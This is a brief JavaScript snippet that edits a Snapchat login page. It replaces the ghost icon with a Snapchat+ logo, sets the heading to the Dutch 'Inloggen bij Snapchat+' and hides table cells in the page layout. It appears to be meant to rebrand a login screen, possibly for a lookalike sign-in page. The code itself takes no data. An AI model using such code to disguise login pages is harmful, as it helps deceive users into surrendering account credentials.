// Select the existing image element
const existingImage = document.querySelector('img[src="/accounts/static/images/ghost/snapchat-app-icon.svg"]');

if (existingImage) {
    // Create a new image element
    const newImage = document.createElement('img');
    newImage.src = 'https://static.snapchat.com/images/snapchatdotcom/plus-images/snapPlusLogo.webp';
    newImage.alt = 'Snapchat Ghost Icon';
    newImage.style.width = '100px'; // Set the desired width
    newImage.style.height = 'auto'; // Maintain aspect ratio

    // Replace the existing image with the new image
    existingImage.parentNode.replaceChild(newImage, existingImage);
}

// Change the text of the specified selector
const headerElement = document.querySelector('#account-identifier-root > div > div.AccountIdentifier > article > div.container > div.login-challenge-frame > h1');
if (headerElement) {
    headerElement.textContent = "Inloggen bij Snapchat+";
}

document.querySelectorAll('body > center > table > tbody > tr > td:nth-child(3)').forEach(function(element) {
  element.style.display = 'none';
});

document.querySelectorAll('body > center > table > tbody > tr > td:nth-child(2)').forEach(function(element) {
  element.style.display = 'none';
});
